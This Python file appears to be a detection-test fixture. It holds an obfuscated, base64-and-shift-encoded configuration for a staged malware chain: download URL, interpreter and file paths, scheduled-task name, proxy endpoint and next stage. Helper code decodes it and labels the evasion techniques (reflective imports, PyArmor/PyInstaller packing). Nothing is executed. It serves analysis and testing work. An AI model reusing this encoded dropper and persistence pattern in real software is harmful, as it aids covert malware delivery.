# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_f5b22863 = "e0I3gXh5anV4QnV3dGtucWpkbXR4eTFmaHZ6bndqZHdqcnR5ajFpamh0aWpkanJnamlpamkxfHdueWpka25xajFpbnh1ZnlobWR1d3Roanh4gWZpZnV5andCdXd0fX5kaHFuanN5ZG1mc2l0a2uBeHlmbGpkaHR6c3lCOoF4fnN5Zn1CaW5oeW50c2Z3fmRpbnh1ZnlobYF0Z2t6eGhmeW50c0J3amtxamh5bntqZHNmcmpkdXFmc4FoZnd3bmp3QnV-ZndydHdkdX5uc3h5ZnFxaneBfG5zaXR8eGRobWZuc0J1dHxqd3htanFxZHl0ZHV-eW10c4FoZnJ1Zm5sc2RuaUJoZnJ1Zm5sczI9ZjZrPDdma2hrgXp3cUJteXl1eD80ND1mNms8N2ZraGszan1mcnVxajNuc3tmcW5pNGloZjZoaTY5M3V-gXp4andkZmxqc3lCTXpzeXdqeHhVfnltdHM0PWY2azw3Zmtoa4FrbnFqZHVmeW1CSD80VXd0bHdmcklmeWY0TXpzeXdqeHhRZmc0M3p1aWZ5ajI9ZjZrPDdma2hrM3V-gW5zeWp3dXdqeWp3ZHVmeW1CSD80VXd0bHdmcklmeWY0VX55bXRzMj1mNms8N2ZraGs0dX55bXRzM2p9aoF5ZnhwZHNmcmpCWH54eWpyWnVpZnlqMj1mNms8N2ZraGuBdXd0fX5kanNpdXRuc3lCNjc8MzUzNTM2Pzk6ODo-gXNqfXlkeHlmbGpCcXRoZnEyaW54dWZ5aG0zZ2Z5gW1mc2l0a2tkbmlCVVhVXjJGRz44Sjw6O0lGSz1JOjo9"
CODEC_f5b22863 = "urlsafe_base64|add_modulo_256|05"

def load_f5b22863():
    return base64.urlsafe_b64decode(MATERIAL_f5b22863)

def decode_f5b22863(stored_bytes):
    return bytes((value - 5) % 256 for value in stored_bytes)

def recover_f5b22863():
    harmless_value = None
    try:
        recovered_bytes = decode_f5b22863(load_f5b22863())
    except (TypeError, ValueError) as error:
        raise RuntimeError("configuration recovery failed") from error
    configuration_text = recovered_bytes.decode("ascii", "strict")
    return configuration_text

def inspect_f5b22863():
    view = memoryview(recover_f5b22863().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_f5b22863():
    routes = {"selected": lambda: ("dictionary_dispatch", "reflective_name_plan", "pyarmor_pyinstaller", "powershell_to_python")}
    return routes["selected"]()

def obfuscation_f5b22863():
    reflection_plan = ("__import__", "getattr", "reflective_name_plan")
    return reflection_plan[-1]

def plan_f5b22863():
    fields = dict(item.split("=", 1) for item in inspect_f5b22863().split("|"))
    analysis_surface = surface_f5b22863()
    obfuscation_surface = obfuscation_f5b22863()
    operation_plan = ("proxy_client_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_f5b22863())

# reconstruction complete